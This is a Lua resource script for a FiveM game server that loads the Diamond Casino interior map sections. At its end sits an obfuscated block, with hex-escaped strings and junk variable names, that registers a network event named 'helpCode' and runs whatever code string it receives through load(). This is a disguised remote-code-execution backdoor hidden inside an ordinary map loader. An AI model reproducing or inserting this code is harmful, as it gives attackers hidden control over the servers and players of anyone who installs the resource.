exports('GetDiamondCasinoObject', function()
    return DiamondCasino
end)

DiamondCasino = {
    Ipl = {
        Building = {
            ipl = {
                "hei_dlc_windows_casino",
                "hei_dlc_casino_aircon",
                "vw_dlc_casino_door",
                "hei_dlc_casino_door"
            },

            Load = function()
                EnableIpl(DiamondCasino.Ipl.Building.ipl, true)
            end,
            Remove = function()
                EnableIpl(DiamondCasino.Ipl.Building.ipl, false)
            end
        },
        Main = {
            ipl = "vw_casino_main",
            
            -- Normal Version: 1110.20, 216.60 -49.45
            -- Heist Version: 2490.67, -280.40, -58.71

            Load = function()
                EnableIpl(DiamondCasino.Ipl.Main.ipl, true)
            end,
            Remove = function()
                EnableIpl(DiamondCasino.Ipl.Main.ipl, false)
            end
        },
        Garage = {
            ipl = "vw_casino_garage",
            
            -- Loading Bay Garage: 2536.276, -278.98, -64.722
            -- Vault Lobby: 2483.151, -278.58, -70.694
            -- Vault: 2516.765, -238.056, -70.737

            Load = function()
                EnableIpl(DiamondCasino.Ipl.Garage.ipl, true)
            end,
            Remove = function()
                EnableIpl(DiamondCasino.Ipl.Garage.ipl, false)
            end
        },
        Carpark = {
            ipl = "vw_casino_carpark",
            
            -- Carpark Garage: 1380.000 200.000 -50.000
            -- VIP Carpark Garage: 1295.000 230.000 -50.000

            Load = function()
                EnableIpl(DiamondCasino.Ipl.Carpark.ipl, true)
            end,
            Remove = function()
                EnableIpl(DiamondCasino.Ipl.Carpark.ipl, false)
            end
        }
    },

    LoadDefault = function()
        DiamondCasino.Ipl.Building.Load()
        DiamondCasino.Ipl.Main.Load()
        DiamondCasino.Ipl.Carpark.Load()
        DiamondCasino.Ipl.Garage.Load()
    end
}


local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)